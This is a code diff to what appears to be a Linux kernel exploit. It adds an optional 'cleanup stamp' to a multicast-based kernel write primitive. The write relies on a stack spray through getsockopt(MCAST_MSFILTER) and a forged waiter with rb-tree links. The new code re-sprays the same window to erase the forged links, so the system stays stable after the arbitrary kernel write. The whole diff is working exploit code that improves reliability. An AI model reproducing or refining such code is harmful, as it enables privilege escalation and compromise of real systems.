@@ -89,6 +89,17 @@ static int multicast_marker_mode(void) {
     return cached;
 }
 
+/* Cleanup stamp after a successful write: on by default, disable with
+ * GHOSTLOCK_MCAST_CLEANUP=0 to compare against the un-cleaned behaviour. */
+static int multicast_cleanup_enabled(void) {
+    static int cached = -1;
+    if (cached < 0) {
+        const char *v = getenv("GHOSTLOCK_MCAST_CLEANUP");
+        cached = (v && v[0] == '0' && v[1] == '\0') ? 0 : 1;
+    }
+    return cached;
+}
+
 /* Stack spray primitive.
  *
  * getsockopt(IPPROTO_IP, MCAST_MSFILTER) copies
@@ -356,6 +367,23 @@ int MulticastWaiterRoute::write(uintptr_t target, uintptr_t value) noexcept {
     usleep(multicast_post_spray_settle_us());
     long r = multicast_waiter_adjust(context);
     pr_info("resident write 0x%zx -> 0x%zx ret=%ld\n", value, target, r);
+    if (r == 0 && multicast_cleanup_enabled()) {
+        /* Cleanup stamp. The write leaves the forged rb links in the dead
+         * waiter, and any later walk that reaches it (another thread's PI
+         * operation, a later sched_setscheduler, ...) keeps following them -
+         * that is the state that wedges the machine even when the process is
+         * parked and never exits. Re-stamp the same window with target == 0,
+         * which skips the erase words and leaves exactly the encoded waiter
+         * the phase-1 probe proved stable (empty rb nodes). The worker does the
+         * stamp, so it lands in the reclaiming thread's kernel frame again. */
+        context->target = 0;
+        context->value = 0;
+        atomic_store(&context->sprayed, 0);
+        atomic_store(&context->respray_requested, 1);
+        while (!atomic_load(&context->sprayed)) sched_yield();
+        usleep(multicast_post_spray_settle_us());
+        pr_success("mcast cleanup stamp landed; forged rb links dropped\n");
+    }
     return r == 0;
 }
 
